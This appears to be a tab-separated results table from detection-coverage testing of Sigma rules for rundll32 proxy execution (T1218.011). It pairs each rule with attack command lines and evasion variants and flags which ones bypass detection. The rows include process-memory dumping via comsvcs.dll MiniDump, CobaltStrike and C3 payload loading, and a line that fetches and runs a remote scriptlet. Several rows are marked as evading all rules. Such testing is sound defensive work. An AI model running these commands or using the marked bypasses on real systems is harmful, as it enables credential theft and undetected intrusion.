Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1218.011	proc_creation_win_citrix_trolleyexpress_procdump	Process Access via TrolleyExpress Exclusion	4c0aaedc-154c-4427-ada0-d80ef9c9deb6		TrolleyExpress.exe 1044	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_hktl_c3_rundll32_pattern	HackTool - F-Secure C3 Load by Rundll32	b18c9d4c-fac9-4708-bd06-dd5bfacf200f		copy rundll32.exe loader.exe && loader.exe payload.dll,StartNodeRelay	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_hktl_c3_rundll32_pattern	HackTool - F-Secure C3 Load by Rundll32	b18c9d4c-fac9-4708-bd06-dd5bfacf200f		rundll32.exe C:\Windows\Temp\payload.dat,StartNodeRelay	TRUE	TRUE	FALSE	Rundll32 Execution With Uncommon DLL Extension (c3a99af4-35a9-4668-879e-c09aeb4f2bdf)
t1218.011	proc_creation_win_hktl_c3_rundll32_pattern	HackTool - F-Secure C3 Load by Rundll32	b18c9d4c-fac9-4708-bd06-dd5bfacf200f		rundll32.exe payload.dll,#1	TRUE	TRUE	TRUE	
t1218.011	proc_creation_win_hktl_cobaltstrike_load_by_rundll32	CobaltStrike Load by Rundll32	ae9c6a7c-9521-42a6-915e-5aaa8689d529	rundll32   2.dll, StartW	rundll32  2.dll, StartW	TRUE	FALSE	FALSE	CobaltStrike Load by Rundll32 (ae9c6a7c-9521-42a6-915e-5aaa8689d529)
t1218.011	proc_creation_win_hktl_cobaltstrike_load_by_rundll32	CobaltStrike Load by Rundll32	ae9c6a7c-9521-42a6-915e-5aaa8689d529	"rundll32.exe  \""payload.dll\"", StartW"	"rundll32.exe ""payload.dll"", StartW"	TRUE	FALSE	FALSE	CobaltStrike Load by Rundll32 (ae9c6a7c-9521-42a6-915e-5aaa8689d529); Rundll32 Execution With Uncommon DLL Extension (c3a99af4-35a9-4668-879e-c09aeb4f2bdf)
t1218.011	proc_creation_win_hktl_cobaltstrike_load_by_rundll32	CobaltStrike Load by Rundll32	ae9c6a7c-9521-42a6-915e-5aaa8689d529		rundll32.exe C:\temp\payload.txt,StartW	TRUE	TRUE	FALSE	Rundll32 Execution With Uncommon DLL Extension (c3a99af4-35a9-4668-879e-c09aeb4f2bdf)
t1218.011	proc_creation_win_hktl_cobaltstrike_load_by_rundll32	CobaltStrike Load by Rundll32	ae9c6a7c-9521-42a6-915e-5aaa8689d529	rundll32.exe  payload.dll,StartW	rundll32.exe payload.dll,StartW	TRUE	FALSE	FALSE	CobaltStrike Load by Rundll32 (ae9c6a7c-9521-42a6-915e-5aaa8689d529)
t1218.011	proc_creation_win_lolbin_pcwutl	Code Execution via Pcwutl.dll	9386d78a-7207-4048-9c9f-a93a7c2d1c05	rundll32.exe   pcwutl.dll,LaunchApplication C:\WINDOWS\System32\notepad.exe	rundll32.exe  pcwutl.dll,LaunchApplication C:\WINDOWS\System32\notepad.exe	TRUE	FALSE	FALSE	Code Execution via Pcwutl.dll (9386d78a-7207-4048-9c9f-a93a7c2d1c05); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9)
t1218.011	proc_creation_win_lolbin_pcwutl	Code Execution via Pcwutl.dll	9386d78a-7207-4048-9c9f-a93a7c2d1c05		copy pcwutl.dll renamed.dll & rundll32.exe renamed.dll,LaunchApplication calc.exe	TRUE	TRUE	FALSE	Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9)
t1218.011	proc_creation_win_lolbin_pcwutl	Code Execution via Pcwutl.dll	9386d78a-7207-4048-9c9f-a93a7c2d1c05	"rundll32.exe  \""pcwutl.dll\"" LaunchApplication calc.exe"	"rundll32.exe ""pcwutl.dll"" LaunchApplication calc.exe"	TRUE	FALSE	FALSE	Code Execution via Pcwutl.dll (9386d78a-7207-4048-9c9f-a93a7c2d1c05); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Rundll32 Execution With Uncommon DLL Extension (c3a99af4-35a9-4668-879e-c09aeb4f2bdf)
t1218.011	proc_creation_win_rundll32_installscreensaver	Rundll32 InstallScreenSaver Execution	15bd98ea-55f4-4d37-b09a-e7caa0fa2221	rundll32.exe   desk.cpl,InstallScreenSaver not_an_scr.scr	rundll32.exe  desk.cpl,InstallScreenSaver not_an_scr.scr	TRUE	FALSE	FALSE	Rundll32 InstallScreenSaver Execution (15bd98ea-55f4-4d37-b09a-e7caa0fa2221)
t1218.011	proc_creation_win_rundll32_installscreensaver	Rundll32 InstallScreenSaver Execution	15bd98ea-55f4-4d37-b09a-e7caa0fa2221		copy rundll32.exe updater.exe && updater.exe desk.cpl,InstallScreenSaver	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_shell32_susp_execution	Shell32 DLL Execution in Suspicious Directory	32b96012-7892-429e-b26c-ac2bf46066ff		rundll32.exe shell32,Control_RunDLL payload.dll	TRUE	TRUE	TRUE	
t1218.011	proc_creation_win_rundll32_shell32_susp_execution	Shell32 DLL Execution in Suspicious Directory	32b96012-7892-429e-b26c-ac2bf46066ff		rundll32.exe shell32.dll,Control_RunDLL payload.dll	TRUE	TRUE	FALSE	Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9)
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9		"""C:\Windows\System32\rundll32.exe"" C:\windows\System32\comsvcs.dll MiniDump 204 C:\Users\thaim\AppData\Local\Temp\svchost-exe.dmp full"	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9		"""powershell.exe"" & {$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore); if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }; & C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full}"	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9		"""C:\WINDOWS\system32\rundll32.exe"" zipfldr.dll,RouteTheCall '%%windir%%\System32\calc.exe'"	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9	"""cmd.exe"" /c rundll32.exe advpack.dll,LaunchINFSection ""C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011.inf"",DefaultInstall_SingleUser,1,"	"""cmd.exe"" /c rundll32.exe advpack.dll,LaunchINFSection ""C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011.inf"",DefaultInstall_SingleUser,1,"	TRUE	FALSE	FALSE	Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9)
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9	"""cmd.exe"" /c rundll32.exe ieadvpack.dll,LaunchINFSection ""C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011.inf"",DefaultInstall_SingleUser,1,"	"""cmd.exe"" /c rundll32.exe ieadvpack.dll,LaunchINFSection ""C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011.inf"",DefaultInstall_SingleUser,1,"	TRUE	FALSE	FALSE	Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9)
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9	"""cmd.exe"" /c rundll32.exe pcwutl.dll,LaunchApplication %%%%windir%%%%\System32\notepad.exe"	"""cmd.exe"" /c rundll32.exe pcwutl.dll,LaunchApplication %%windir%%\System32\notepad.exe"	TRUE	FALSE	FALSE	Code Execution via Pcwutl.dll (9386d78a-7207-4048-9c9f-a93a7c2d1c05); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9)
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9	"""cmd.exe"" /c rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 ""C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011_DefaultInstall.inf"""	"""cmd.exe"" /c rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 ""C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011_DefaultInstall.inf"""	TRUE	FALSE	FALSE	Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9)
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9	"""cmd.exe"" /c rundll32.exe shell32.dll,Control_RunDLL ""C:\AtomicRedTeam\atomics\T1047\bin\calc.dll"""	"""cmd.exe"" /c rundll32.exe shell32.dll,Control_RunDLL ""C:\AtomicRedTeam\atomics\T1047\bin\calc.dll"""	TRUE	FALSE	FALSE	Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9)
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9	"""cmd.exe"" /c rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 ""C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011_DefaultInstall.inf"""	"""cmd.exe"" /c rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 ""C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011_DefaultInstall.inf"""	TRUE	FALSE	FALSE	Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9)
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9	"""cmd.exe"" /c rundll32.exe url.dll,FileProtocolHandler calc.exe"	"""cmd.exe"" /c rundll32.exe url.dll,FileProtocolHandler calc.exe"	TRUE	FALSE	FALSE	Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9)
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9	"""cmd.exe"" /c rundll32.exe url.dll,OpenURL ""C:\AtomicRedTeam\atomics\T1218.011\src\index.hta"" & rundll32.exe URL.dll,FileProtocolHandler ""C:\AtomicRedTeam\atomics\T1218.011\src\akteullen.vbs"""	"""cmd.exe"" /c rundll32.exe url.dll,OpenURL ""C:\AtomicRedTeam\atomics\T1218.011\src\index.hta"" & rundll32.exe URL.dll,FileProtocolHandler ""C:\AtomicRedTeam\atomics\T1218.011\src\akteullen.vbs"""	TRUE	FALSE	FALSE	Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9)
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9		"""powershell.exe"" & {rundll32.exe zipfldr.dll,RouteTheCall \""""'%%windir%%\System32\calc.exe'\""""}"	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9	"cmd.exe /c ""rundll32.exe  advpack.dll,LaunchINFSection \""C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011.inf\"",DefaultInstall_SingleUser,1,"""	"rundll32.exe  advpack.dll,LaunchINFSection ""C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011.inf"",DefaultInstall_SingleUser,1,"	TRUE	FALSE	FALSE	Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9)
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9	"cmd.exe /c ""rundll32.exe  ieadvpack.dll,LaunchINFSection \""C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011.inf\"",DefaultInstall_SingleUser,1,"""	"rundll32.exe  ieadvpack.dll,LaunchINFSection ""C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011.inf"",DefaultInstall_SingleUser,1,"	TRUE	FALSE	FALSE	Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9)
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9	"cmd.exe /c ""rundll32.exe  pcwutl.dll,LaunchApplication C:\WINDOWS\System32\notepad.exe"""	rundll32.exe  pcwutl.dll,LaunchApplication C:\WINDOWS\System32\notepad.exe	TRUE	FALSE	FALSE	Code Execution via Pcwutl.dll (9386d78a-7207-4048-9c9f-a93a7c2d1c05); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9)
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9	"cmd.exe /c ""rundll32.exe  setupapi.dll,InstallHinfSection DefaultInstall 128 \""C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011_DefaultInstall.inf\"""""	"rundll32.exe  setupapi.dll,InstallHinfSection DefaultInstall 128 ""C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011_DefaultInstall.inf"""	TRUE	FALSE	FALSE	Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9)
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9	"cmd.exe /c ""rundll32.exe  shell32.dll,Control_RunDLL \""C:\AtomicRedTeam\atomics\T1047\bin\calc.dll\"""""	"rundll32.exe  shell32.dll,Control_RunDLL ""C:\AtomicRedTeam\atomics\T1047\bin\calc.dll"""	TRUE	FALSE	FALSE	Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9)
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9	"cmd.exe /c ""rundll32.exe  syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 \""C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011_DefaultInstall.inf\"""""	"rundll32.exe  syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 ""C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011_DefaultInstall.inf"""	TRUE	FALSE	FALSE	Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9)
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9	"cmd.exe /c ""rundll32.exe  URL.dll,FileProtocolHandler \""C:\AtomicRedTeam\atomics\T1218.011\src\akteullen.vbs\"""""	"rundll32.exe  URL.dll,FileProtocolHandler ""C:\AtomicRedTeam\atomics\T1218.011\src\akteullen.vbs"""	TRUE	FALSE	FALSE	Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9)
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9	"cmd.exe /c ""rundll32.exe  url.dll,FileProtocolHandler calc.exe"""	rundll32.exe  url.dll,FileProtocolHandler calc.exe	TRUE	FALSE	FALSE	Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9)
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9	"cmd.exe /c ""rundll32.exe  url.dll,OpenURL \""C:\AtomicRedTeam\atomics\T1218.011\src\index.hta\"""""	"rundll32.exe  url.dll,OpenURL ""C:\AtomicRedTeam\atomics\T1218.011\src\index.hta"""	TRUE	FALSE	FALSE	Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9)
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9		copy comsvcs.dll backup.dll && rundll32.exe backup.dll,MiniDump 1000 C:\Temp\dump.bin full	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_susp_activity	Potentially Suspicious Rundll32 Activity	e593cf51-88db-4ee1-b920-37e89012a3c9		rundll32.exe shell32.dll,#250	TRUE	TRUE	TRUE	
t1218.011	proc_creation_win_rundll32_susp_control_dll_load	Suspicious Control Panel DLL Load	d7eb979b-c2b5-4a6f-a3a7-c87ce6763819		"rundll32.exe payload.dll,DllMain ""Shell32.dll"""	TRUE	TRUE	TRUE	
t1218.011	proc_creation_win_rundll32_susp_execution_with_image_extension	Suspicious Rundll32 Execution With Image Extension	4aa6040b-3f28-44e3-a769-9208e5feb5ec		"""C:\WINDOWS\system32\rundll32.exe"" C:\Users\thaim\Downloads\calc.png StartW"	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_susp_execution_with_image_extension	Suspicious Rundll32 Execution With Image Extension	4aa6040b-3f28-44e3-a769-9208e5feb5ec		cd C:\test\ && copy malicious.dll photo.jpg && rundll32.exe .\photo.jpg,DllMain	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_susp_execution_with_image_extension	Suspicious Rundll32 Execution With Image Extension	4aa6040b-3f28-44e3-a769-9208e5feb5ec		copy calc.dll calc.dat && rundll32.exe calc.dat,DllMain	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_susp_execution_with_image_extension	Suspicious Rundll32 Execution With Image Extension	4aa6040b-3f28-44e3-a769-9208e5feb5ec	"rundll32.exe  \""C:\path\to\malicious_image.jpg \"" ,DllMain"	"rundll32.exe ""C:\path\to\malicious_image.jpg "" ,DllMain"	TRUE	FALSE	FALSE	Suspicious Rundll32 Execution With Image Extension (4aa6040b-3f28-44e3-a769-9208e5feb5ec); Rundll32 Execution With Uncommon DLL Extension (c3a99af4-35a9-4668-879e-c09aeb4f2bdf)
t1218.011	proc_creation_win_rundll32_susp_execution_with_image_extension	Suspicious Rundll32 Execution With Image Extension	4aa6040b-3f28-44e3-a769-9208e5feb5ec	rundll32.exe  shell32.dll,Control_RunDLL C:\Users\Public\malicious.png	rundll32.exe shell32.dll,Control_RunDLL C:\Users\Public\malicious.png	TRUE	FALSE	FALSE	Shell32 DLL Execution in Suspicious Directory (32b96012-7892-429e-b26c-ac2bf46066ff); Suspicious Rundll32 Execution With Image Extension (4aa6040b-3f28-44e3-a769-9208e5feb5ec); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9); Potentially Suspicious Rundll32 Activity (e593cf51-88db-4ee1-b920-37e89012a3c9)
t1218.011	proc_creation_win_rundll32_sys	Suspicious Rundll32 Activity Invoking Sys File	731231b9-0b5d-4219-94dd-abb6959aa7ea	cmd.exe /c rename dummy.sys dummy.dll & rundll32.exe dummy.dll,EntryPoint	cmd.exe /c rename dummy.sys dummy.dll & rundll32.exe dummy.dll,EntryPoint	TRUE	FALSE	FALSE	Suspicious Rundll32 Activity Invoking Sys File (731231b9-0b5d-4219-94dd-abb6959aa7ea)
t1218.011	proc_creation_win_rundll32_sys	Suspicious Rundll32 Activity Invoking Sys File	731231b9-0b5d-4219-94dd-abb6959aa7ea		"rundll32.exe ""dummy.sys"",EntryPoint"	TRUE	TRUE	FALSE	Rundll32 Execution With Uncommon DLL Extension (c3a99af4-35a9-4668-879e-c09aeb4f2bdf)
t1218.011	proc_creation_win_rundll32_sys	Suspicious Rundll32 Activity Invoking Sys File	731231b9-0b5d-4219-94dd-abb6959aa7ea		rundll32.exe dummy.sys.,EntryPoint	TRUE	TRUE	FALSE	Rundll32 Execution With Uncommon DLL Extension (c3a99af4-35a9-4668-879e-c09aeb4f2bdf)
t1218.011	proc_creation_win_rundll32_udl_exec	Potentially Suspicious Rundll32.EXE Execution of UDL File	0ea52357-cd59-4340-9981-c46c7e900428		"""rundll32.exe"" ""msado15.dll,OpenDSLFile"" ""C:\Users\Public\Downloads\example.udl"""	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_udl_exec	Potentially Suspicious Rundll32.EXE Execution of UDL File	0ea52357-cd59-4340-9981-c46c7e900428		cmd.exe /c rundll32.exe oledb32.dll,OpenDSLFile C:\Users\user\Downloads\test.udl	TRUE	TRUE	TRUE	
t1218.011	proc_creation_win_rundll32_udl_exec	Potentially Suspicious Rundll32.EXE Execution of UDL File	0ea52357-cd59-4340-9981-c46c7e900428		"rundll32.exe oledb32.dll,OpenDSLFile ""C:\Users\admin\Downloads\test.udl"""	TRUE	TRUE	TRUE	
t1218.011	proc_creation_win_rundll32_udl_exec	Potentially Suspicious Rundll32.EXE Execution of UDL File	0ea52357-cd59-4340-9981-c46c7e900428		rundll32.exe oledb32.dll,OpenDSLFile C:\ProgramData\test.udl	TRUE	TRUE	TRUE	
t1218.011	proc_creation_win_rundll32_uncommon_dll_extension	Rundll32 Execution With Uncommon DLL Extension	c3a99af4-35a9-4668-879e-c09aeb4f2bdf		"""C:\WINDOWS\system32\rundll32.exe"" keymgr,KRShowKeyMgr"	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_uncommon_dll_extension	Rundll32 Execution With Uncommon DLL Extension	c3a99af4-35a9-4668-879e-c09aeb4f2bdf		"""C:\WINDOWS\system32\rundll32.exe"" C:\Users\thaim\Downloads\calc.png StartW"	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_rundll32_uncommon_dll_extension	Rundll32 Execution With Uncommon DLL Extension	c3a99af4-35a9-4668-879e-c09aeb4f2bdf	"rundll32   vbscript:\""\..\mshtml,#135 \""+String(CreateObject(\""WScript.Shell\"").Run(\""calc.exe\""),0)"	"rundll32  vbscript:""\..\mshtml,#135 ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)"	TRUE	FALSE	FALSE	Mshtml.DLL RunHTMLApplication Suspicious Usage (4782eb5a-a513-4523-a0ac-f3082b26ac5c); Mshtml.DLL RunHTMLApplication Suspicious Usage (4782eb5a-a513-4523-a0ac-f3082b26ac5c); Wscript Shell Run In CommandLine (2c28c248-7f50-417a-9186-a85b223010ee); Wscript Shell Run In CommandLine (2c28c248-7f50-417a-9186-a85b223010ee); Rundll32 Execution With Uncommon DLL Extension (c3a99af4-35a9-4668-879e-c09aeb4f2bdf)
t1218.011	proc_creation_win_rundll32_uncommon_dll_extension	Rundll32 Execution With Uncommon DLL Extension	c3a99af4-35a9-4668-879e-c09aeb4f2bdf	"rundll32   vbscript:\""\..\mshtml,RunHTMLApplication \""+String(CreateObject(\""WScript.Shell\"").Run(\""calc.exe\""),0)"	"rundll32  vbscript:""\..\mshtml,RunHTMLApplication ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)"	TRUE	FALSE	FALSE	Mshtml.DLL RunHTMLApplication Suspicious Usage (4782eb5a-a513-4523-a0ac-f3082b26ac5c); Mshtml.DLL RunHTMLApplication Suspicious Usage (4782eb5a-a513-4523-a0ac-f3082b26ac5c); Wscript Shell Run In CommandLine (2c28c248-7f50-417a-9186-a85b223010ee); Wscript Shell Run In CommandLine (2c28c248-7f50-417a-9186-a85b223010ee); Rundll32 Execution With Uncommon DLL Extension (c3a99af4-35a9-4668-879e-c09aeb4f2bdf)
t1218.011	proc_creation_win_rundll32_uncommon_dll_extension	Rundll32 Execution With Uncommon DLL Extension	c3a99af4-35a9-4668-879e-c09aeb4f2bdf	rundll32.exe   C:\AtomicRedTeam\atomics\T1218.011\bin\_WT.init,krnl	rundll32.exe  C:\AtomicRedTeam\atomics\T1218.011\bin\_WT.init,krnl	TRUE	FALSE	FALSE	Rundll32 Execution With Uncommon DLL Extension (c3a99af4-35a9-4668-879e-c09aeb4f2bdf); Rundll32 Execution With Uncommon DLL Extension (c3a99af4-35a9-4668-879e-c09aeb4f2bdf)
t1218.011	proc_creation_win_rundll32_uncommon_dll_extension	Rundll32 Execution With Uncommon DLL Extension	c3a99af4-35a9-4668-879e-c09aeb4f2bdf	"rundll32.exe   javascript:\""\..\mshtml,RunHTMLApplication \"";document.write();GetObject(\""script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct\"").Exec();window.close();"	"rundll32.exe  javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct"").Exec();window.close();"	TRUE	FALSE	FALSE	Mshtml.DLL RunHTMLApplication Suspicious Usage (4782eb5a-a513-4523-a0ac-f3082b26ac5c); Mshtml.DLL RunHTMLApplication Suspicious Usage (4782eb5a-a513-4523-a0ac-f3082b26ac5c); Rundll32 Execution With Uncommon DLL Extension (c3a99af4-35a9-4668-879e-c09aeb4f2bdf)
t1218.011	proc_creation_win_rundll32_uncommon_dll_extension	Rundll32 Execution With Uncommon DLL Extension	c3a99af4-35a9-4668-879e-c09aeb4f2bdf		"""C:\Windows\System32\RUNDLL32.EXE"" -sta {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"	FALSE	FALSE	FALSE	
